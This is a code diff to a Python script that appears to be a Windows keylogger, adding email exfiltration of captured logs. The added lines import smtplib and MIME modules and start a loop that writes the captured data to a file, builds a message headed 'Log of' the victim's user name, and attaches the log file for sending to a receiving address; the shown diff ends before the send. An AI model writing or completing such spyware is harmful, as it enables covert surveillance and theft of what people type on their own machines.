@@ -5,6 +5,11 @@ import requests
 import socket
 import win32gui
 import credentials
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 
 absoluteTime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
@@ -69,3 +74,24 @@ def send_logs():
     MIN = 10
     SECONDS = 60
     time.sleep(30)
+
+    while True:
+        if len(displayData) > 1:
+            try:
+                write_file(count)
+
+                subject = f'["Log of "{user}] ~ {count}'
+
+                log = MIMEMultipart()
+                log['From'] = sendEmail
+                log['To'] = receiveEmail
+                log['Subject'] = subject
+                body = 'testing'
+                log.attach(MIMEText(body, 'plain'))
+
+                attachment = open(toDeleteFile[0], 'rb')
+                print('attachment')
+
+                filename = toDeleteFile[0].split('/')[2]
+
+
